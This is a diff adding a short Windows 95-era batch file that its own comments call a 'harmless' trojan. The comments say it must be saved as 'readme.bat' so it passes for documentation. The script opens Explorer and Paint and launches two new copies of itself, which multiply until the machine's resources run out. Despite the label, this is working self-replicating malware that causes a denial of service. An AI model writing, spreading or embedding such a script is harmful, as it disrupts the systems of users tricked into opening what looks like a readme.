@@ -1,0 +1,15 @@
+@echo off
+
+rem A Harmless Windows 95 Trojan
+rem Written by DrNo of -=(PHILA)=-
+
+rem NB: File must be saved as 'readme.bat' in the path
+
+@echo.
+@echo. A Harmless Windows 95 Trojan
+@echo.
+
+start readme.bat
+explorer
+pbrush clouds
+start readme.bat
